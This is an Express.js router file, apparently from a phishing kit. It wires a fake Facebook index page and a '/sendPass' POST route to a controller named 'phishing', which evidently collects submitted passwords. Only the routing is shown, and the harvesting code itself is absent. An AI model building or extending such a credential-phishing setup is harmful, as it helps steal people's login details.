const expressFunction = require('express');

//this is like a mini express app which is pluggable into another express app
const router = expressFunction.Router();
const path = require('path');
const rootDir = require('../util/path');

const phishingController = require('../controllers/phishing');

router.get("/", phishingController.getFacebookIndex);
router.post('/sendPass', phishingController.sendPass);

module.exports = router;